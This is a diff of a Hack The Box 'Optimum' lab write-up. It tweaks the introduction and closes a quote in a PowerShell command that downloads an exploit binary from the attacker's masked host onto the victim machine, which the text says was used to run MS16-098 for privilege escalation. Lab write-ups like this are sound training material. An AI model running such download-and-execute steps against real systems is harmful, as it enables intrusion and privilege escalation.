@@ -8,7 +8,7 @@ image: htb/optimum/optimum.png
 
 # Introduction
 
-This box was interesting in the sense it really honed in on the importance of enumeration, gave me a solid foundation on windows privilege escalation that I can refer back to and that you can’t rely on the exploit tools to do all the work for you! Lets get started.
+This box was interesting and a pain, it took me longer than it should have but it gave me a solid foundation on windows privilege escalation that I can refer back to and that you can’t rely on the exploit tools to do all the work for you! Lets get started.
 
 # Reconnaissance & Enumeration
 
@@ -139,7 +139,7 @@ After trial and error, MS16-098 got me that nice root shell :)
 I placed the exploit on the python webserver, downloaded it from the victims machine and then executed it.
 
 ```windows
-C:\Users\kostas\Desktop>powershell.exe -c "(New-Object System.Net.WebClient).DownloadFile('http://10.X.X.X/bfill.exe','C:\Users\kostas\Desktop\exploit.exe')
+C:\Users\kostas\Desktop>powershell.exe -c "(New-Object System.Net.WebClient).DownloadFile('http://10.X.X.X/bfill.exe','C:\Users\kostas\Desktop\exploit.exe')"
 ```
 
 ```windows
